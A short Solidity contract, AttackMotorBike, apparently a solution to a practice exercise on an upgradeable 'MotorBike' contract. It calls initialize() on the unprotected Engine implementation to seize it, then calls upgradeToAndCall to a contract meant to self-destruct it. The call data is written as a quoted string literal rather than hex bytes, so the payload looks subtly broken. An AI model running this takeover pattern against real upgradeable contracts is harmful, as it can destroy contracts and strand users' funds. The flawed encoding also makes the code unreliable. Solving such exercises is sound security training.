pragma solidity <0.7.0;
import "../../../Exercise/Stage3/25/MotorBike.sol";

contract AttackMotorBike {
    Engine engineContract;

    constructor(Engine _engineContract) public {
        engineContract = _engineContract;
    }

    function attack(address destroyingContract) public payable {
        engineContract.initialize();
        engineContract.upgradeToAndCall(destroyingContract, "0x00f55d9d00000000000000000000000070997970C51812dc3A010C7d01b50e0d17dc79C8");

    }
}
